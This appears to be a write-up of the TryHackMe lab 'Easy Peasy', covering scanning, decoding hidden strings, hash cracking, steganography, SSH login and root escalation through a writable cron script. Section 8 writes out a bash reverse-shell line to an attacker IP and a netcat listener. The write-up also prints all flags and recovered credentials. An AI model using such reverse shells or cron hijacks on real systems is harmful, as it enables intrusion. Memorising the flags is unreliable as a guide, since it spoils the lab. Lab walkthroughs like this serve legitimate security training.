# TryHackMe — Easy Peasy

> A multi-flag box that chains hidden HTML, multiple encodings (Base64 / Base85 / binary / ROT13), hash cracking, steganography, and a writable root cron job for privilege escalation.

![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green)
![Focus](https://img.shields.io/badge/Focus-Privilege%20Escalation-orange?style=flat-square)
![Status](https://img.shields.io/badge/Status-Completed-success?style=flat-square)

---
## 🗺️ Attack Path Summary

```
Nmap scan (80, 6498, 65524)
        │
        ▼
Gobuster on :80 → /hidden → /hidden/whatever
        │
        ▼
Hidden <p> in HTML → Base64 decode → FLAG 1
        │
        ▼
Apache default page on :65524
   ├── Flag hidden in boilerplate text → FLAG (labeled "3")
   └── Hidden <span> → Base85 decode → path "/n0th1ng3ls3m4tt3r"
        │
        ▼
Matrix page reveals a hash → crack with john --format=gost
        │
        ▼
Password "mypasswordforthatjob" → stegseek on Untitled.jpeg
        │
        ▼
secrettext.txt → username "boring" + binary-encoded password
        │
        ▼
Decode binary → "iconvertedmypasswordtobinary"
        │
        ▼
robots.txt on :65524 → hidden MD5 hash → crack → FLAG (second)
        │
        ▼
SSH as boring (port 6498) → USER FLAG (ROT13-encoded)
        │
        ▼
/etc/crontab → root runs /var/www/.mysecretcronjob.sh every minute
        │
        ▼
Script is writable by boring → inject reverse shell payload
        │
        ▼
nc listener catches root shell → ROOT FLAG
```

---

## 1. Reconnaissance — Nmap Scan

```bash
nmap -sV -sC -p- 10.49.181.74
```

<img width="844" height="434" alt="1" src="https://github.com/user-attachments/assets/a33b5e36-4b22-4a7f-be7d-7833cbcefce8" />

**Results:**

|    Port   | Service |            Version              |
|-----------|---------|---------------------------------|
|   80/tcp  |  http   |          nginx 1.16.1           |
|  6498/tcp |   ssh   | OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 |
| 65524/tcp |  http   |  Apache httpd 2.4.43 (Ubuntu)   |

---

## 2. Web Enumeration — Port 80

### Directory brute-force on the root web server

```bash
gobuster dir -u 10.49.181.74 -w /usr/share/wordlists/dirb/common.txt
```

<img width="761" height="374" alt="2" src="https://github.com/user-attachments/assets/bf7af404-6d95-4ad8-9930-a9e960fe8dad" />


### `/hidden/`

<img width="1112" height="369" alt="3" src="https://github.com/user-attachments/assets/657cfdbe-32b6-47c4-a730-5c2a711d5b01" />

### Fuzzing inside `/hidden`

```bash
gobuster dir -u http://10.49.181.74/hidden -w /usr/share/wordlists/dirb/common.txt
```

<img width="816" height="356" alt="4" src="https://github.com/user-attachments/assets/c42edc8c-7e55-49f7-ab46-a6746400a447" />

Found `/hidden/whatever` (redirects to `/hidden/whatever/`).

### `/hidden/whatever/` — hidden element in source

<img width="1177" height="403" alt="5" src="https://github.com/user-attachments/assets/ee23a215-85e7-4eac-b5d6-9f2a2d503ff4" />

Opening the browser Inspector reveals a hidden `<p>` element containing a Base64 string:

```html
<p hidden="">ZmxhZz3tmMXJzNl9mbDRnfQ==</p>
```

### Decoding it

```bash
echo 'ZmxhZz3tmMXJzNl9mbDRnfQ==' | base64 --decode
```

<img width="472" height="69" alt="6" src="https://github.com/user-attachments/assets/656a1df9-a7ff-42e4-bbed-d80d33598adb" />

🚩 **Flag found:** `flag{f1rs7_fl4g}`

---

## 3. Web Enumeration — Port 65524

### Apache default page

<img width="957" height="400" alt="7-1" src="https://github.com/user-attachments/assets/481c9fca-32ab-4667-85f9-2922939df5a5" />

Looks like a stock Debian/Apache default page at first glance — but scrolling through the boilerplate configuration text reveals an injected line:

<img width="766" height="75" alt="7-2" src="https://github.com/user-attachments/assets/6b75e5b9-c12a-4e1f-b2a5-e78babcdb465" />

🚩 **Flag found (labeled "Flag 3" on the page):** `flag{9dafbd64c47471a8f54cd3fc64cd312}`

### Hidden encoded hint in page source

Viewing the page source of the same Apache default page shows another hidden `<span>`:

```html
<span hidden>its encoded with ba....: ObsJmP173N2X6dOrAgEAL0Vu=</span>
```

<img width="507" height="68" alt="8-1" src="https://github.com/user-attachments/assets/dd94ae5f-727b-4484-bdfc-4cd789a4dec1" />

The "ba...." hint points to a non-standard Base alphabet. Decoding as **Base85** in CyberChef:

<img width="284" height="181" alt="8-2" src="https://github.com/user-attachments/assets/6632b8e8-c307-44c2-aef5-0fe00518c4dd" />

**Decoded value:** `/n0th1ng3ls3m4tt3r` — a URL path.

---

## 4. The "Nothing Else Matters" Page

Browsing to the decoded path on the same port:

```
http://10.49.181.74:65524/n0th1ng3ls3m4tt3r/
```

<img width="1126" height="313" alt="9" src="https://github.com/user-attachments/assets/8666612f-d022-40c3-8283-a5d856449205" />

A "Matrix rain" themed page displaying a long hex string:

```
940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81
```

### Identifying the hash type

```bash
hash-identifier 940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81
```

<img width="796" height="310" alt="10" src="https://github.com/user-attachments/assets/7a783015-0da6-4299-adc8-e97d4ecc8ebe" />

Flagged as possible **SHA-256** or **Haval-256** — but cracking attempts under those formats failed (John auto-detected it as other algorithm families like `gost`, `cryptoSafe`, `skein-256`, etc. based on string shape).

### Cracking the hash

```bash
echo '940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81' > hash.txt
john --wordlist=easypeasy_1596838725703.txt --format=gost hash.txt
```

<img width="886" height="658" alt="11" src="https://github.com/user-attachments/assets/cc0101c3-b490-422f-8c52-0691fc4b8365" />

🔑 **Cracked password:** `mypasswordforthatjob`

---

## 5. Steganography — Recovering Hidden Credentials

An image (`Untitled.jpeg`) collected earlier in the enumeration was tested against the cracked password using `stegseek`:

```bash
stegseek Untitled.jpeg easypeasy_1596838725703.txt
```

<img width="1280" height="266" alt="12-1" src="https://github.com/user-attachments/assets/bf9847ca-7e01-439f-a90a-8914929659bf" />

```
[i] Found passphrase: "mypasswordforthatjob"
[i] Original filename: "secrettext.txt".
[i] Extracting to "Untitled.jpeg.out".
```

```bash
cat Untitled.jpeg.out
```

```
username: boring
password: 01101001 01100011 01101111 01101110 01110110 01100101 01110010 01110100 01100100 ...
```

The password is binary-encoded ASCII. Decoding it in CyberChef:

<img width="621" height="207" alt="12-2" src="https://github.com/user-attachments/assets/92f051f4-29c5-4565-831d-b20f58182a67" />

**Decoded password:** `iconvertedmypasswordtobinary`

**Credential pair recovered:** `boring : iconvertedmypasswordtobinary`

---

## 6. A Second Flag in `robots.txt`

While enumerating port `65524` further, `robots.txt` also contained a planted value disguised as a `User-Agent` line:

<img width="740" height="188" alt="13-1" src="https://github.com/user-attachments/assets/7d6ba53c-c963-4b69-9ff3-e0158cd93ce2" />

### Identifying and cracking the hash

```bash
hash-identifier a18672860d0510e5ab6699730763b250
```

<img width="709" height="319" alt="13-2" src="https://github.com/user-attachments/assets/37b93f08-40b8-47fc-881b-74b56d18a29c" />

Identified as **MD5** — cracked via lookup:

<img width="502" height="90" alt="14" src="https://github.com/user-attachments/assets/b1427bdb-d8a7-4f88-9327-3da7fc5a5310" />

🚩 **Flag found:** `flag{1m_s3c0nd_fl4g}`

---

## 7. SSH Access

With valid credentials (`boring` / `iconvertedmypasswordtobinary`) and the non-standard SSH port from the nmap scan (`6498`):

```bash
ssh boring@10.49.181.74 -p 6498
```

<img width="749" height="381" alt="15" src="https://github.com/user-attachments/assets/985dd20a-8e0d-42b9-9159-cf1ee50d6ff9" />

Login succeeds (past a theatrical "AC-130" warning banner), dropping into a shell as `boring@kral4-PC`.

### Capturing the user flag

<img width="512" height="100" alt="16-1" src="https://github.com/user-attachments/assets/c20e2203-d956-4ebe-bd48-51c392d1ad6e" />

```
User Flag But It Seems Wrong Like It`s Rotated Or Something
synt{a0jvgf33zfa0ez4y}
```

The flag itself is ROT13-rotated. Decoding in CyberChef:

<img width="276" height="165" alt="16-2" src="https://github.com/user-attachments/assets/74212535-7a83-462a-a8f2-de4001dc81c6" />

🚩 **User flag:** `flag{n0wits33msn0rm4l}`

---

## 8. Privilege Escalation — Writable Root Cron Job

### Checking `/etc/crontab`

```bash
cat /etc/crontab
```

<img width="861" height="289" alt="17" src="https://github.com/user-attachments/assets/a640bff7-4a4e-4c5e-9bf6-f23c0fcdf2cc" />

Among the standard entries, a custom job stands out:

```
* * * * * root cd /var/www/ && sudo bash .mysecretcronjob.sh
```

This runs **every minute, as root**.

### Checking permissions on the script

```bash
cd /var/www/
ls -la
cat .mysecretcronjob.sh
```

<img width="540" height="166" alt="18" src="https://github.com/user-attachments/assets/8433caf0-9c8b-42d5-9d0c-93a902dc6a7a" />

```
-rwxr-xr-x  1 boring boring  33 Jun 14  2020 .mysecretcronjob.sh
```

The script is **owned by `boring`** — the user we're currently logged in as — yet it's executed as root once a minute via cron. This is a direct privilege escalation path: overwrite the script's contents with our own payload.

### Weaponizing the cron job

Edited the script to add a reverse shell:

```bash
nano .mysecretcronjob.sh
```

```bash
#!/bin/bash
# i will run as root
/bin/bash -i >& /dev/tcp/192.168.137.77/1337 0>&1
```

<img width="461" height="113" alt="19" src="https://github.com/user-attachments/assets/2dd8218b-5add-4b86-9320-14fe5a4552c2" />

### Catching the shell

On the attacking machine, started a listener and waited for the next cron tick (≤60 seconds):

```bash
nc -lnvp 1337
```

<img width="678" height="173" alt="20" src="https://github.com/user-attachments/assets/5d600b92-9fe5-4306-8482-bae4bf56e8e0" />

Root access achieved.

### Capturing the root flag

<img width="512" height="298" alt="21" src="https://github.com/user-attachments/assets/69208df9-3747-4aa5-bf57-bf351017999e" />

🚩 **Root flag:** `flag{63a9f0ea7bb98050796b649e85481845}`
